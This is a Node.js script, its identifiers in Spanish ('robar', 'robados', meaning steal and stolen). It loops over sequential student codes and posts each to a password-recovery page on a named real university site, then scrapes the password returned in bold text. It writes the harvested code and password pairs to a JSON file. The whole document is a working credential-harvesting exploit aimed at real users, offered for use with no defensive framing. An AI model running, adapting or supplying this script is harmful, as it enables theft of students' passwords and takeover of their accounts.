var fs      = require('fs');
var request = require('request');
var cheerio = require('cheerio');

var robados = [];
var url = 'http://www.unap.edu.pe/cidiomas/index.php?i=0&z=1&pag=recordar_pas&m=1';
const desde = 140000;
const hasta = 140010;

var consultasRestantes = hasta-desde+1;

function robar(){
  var codigos = [];

  for(let i=desde; i<=hasta; i++){
    codigos.push('E'+i);
  }

  codigos.forEach(function(codigo){
    request.post({
      url: url, 
      form: {
        txtCod: codigo,
        btnbusca: 'Buscar'
      }
    },
    function(error, response, html){
      if(!error){
        if(html.indexOf('<b>') != -1 ){
          var $ = cheerio.load(html);
          console.log(codigo,$('b').text());
          robados.push({
            codigo: codigo,
            password: $('b').text()
          })
        }else{
            console.log(codigo,'null');
        }
      }
      consultasRestantes = consultasRestantes - 1;
      
    })
  });

}

function comprobarFinalizacion(){
  console.log('restantes=',consultasRestantes);
  if(consultasRestantes<=0){ 
    robados.sort(function(a,b){
        if(a.codigo>b.codigo) return 1;
        if(b.codigo>a.codigo) return -1;
        return 0;
    })
    fs.writeFile('codigos.json', JSON.stringify(robados), function(err){
      console.log('Archivo escrito correctamente! - verifique el archivo codigos.json');
    })
  }else{
    setTimeout(function(){
        comprobarFinalizacion();
    },5000);
  }
}

robar();
comprobarFinalizacion();